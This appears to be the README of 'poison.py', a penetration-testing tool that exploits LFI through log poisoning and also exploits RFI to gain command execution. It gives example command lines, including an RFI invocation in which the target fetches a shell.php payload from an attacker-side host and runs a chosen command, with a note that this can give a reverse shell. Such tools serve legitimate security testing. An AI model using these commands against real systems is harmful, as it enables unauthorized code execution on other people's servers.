# poison.py
Fast tool to search accessible log's files for LFI/RFI vulnerabilities, and automatic escalation to shell
all the wordlists and payloads is included

## Exploitation:
![Preview](https://github.com/user-attachments/assets/8d658876-79d6-41f1-9456-91681be9782e)



## Example usage (LFI):
```
./poison.py -u 'http://127.0.0.1/file.php?file=' -e 'id' -p src/payloads.txt -w src/small.txt
```
_____________________________________________________________________________________________
```
-u 'http://127.0.0.1/file.php?file=' # URL for poison the log
```

```
-e 'id' # Command to execute (In this time, command is id) (this option can be used for rev. shell)
```

```
-p src/payloads.txt # list of paylods during the poisoning
```

```
-w src/small.txt # wordlist using the search for available log's file
```
## Example usage (RFI):
```
/poison.py -u 'http://127.0.0.1/index.php?page=' --rfi --lhost 10.10.10.10 --rhost 127.0.0.1 --rport 14852 --lfile 'src/shell.php' -e 'id' --cookie 'PHPSESSID=1234567890'
```
![screenshot](https://github.com/user-attachments/assets/061fdbe8-5b76-43d8-816f-068abf521744)
_____________________________________________________________________________________________
```
--rfi # Remote File Inclusion option
```

```
--lhost 10.10.10.10 # which network interface to bind the local HTTP server to (necesssary only on remote explotiation)
```

```
-rhost 127.0.0.1 # remote-ip-address of http-server in request during the RFI
```

```
--rport 14852 # remote-port of http-server in request during the RFI
```

```
--lfile 'src/shell.php' # payload which include in the request during the RFI
```

```
-e 'id' # command for src/shell.php 
```

```
--cookie 'PHPSESSID=1234567890' # cookie for authorized requests
```

# ToDo list:
-   [x] Add the function with command execution
-   [x] Add the support of wordlist's
-   [ ] Add different injection endpoints (Headers)
-   [ ] Interactive shell 
-   [X] Add the function for RFI

# FOR EDUCATIONAL PURPOSES ONLY!
Usage of poison.py for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Author assume no liability and are not responsible for any misuse or damage caused by this program
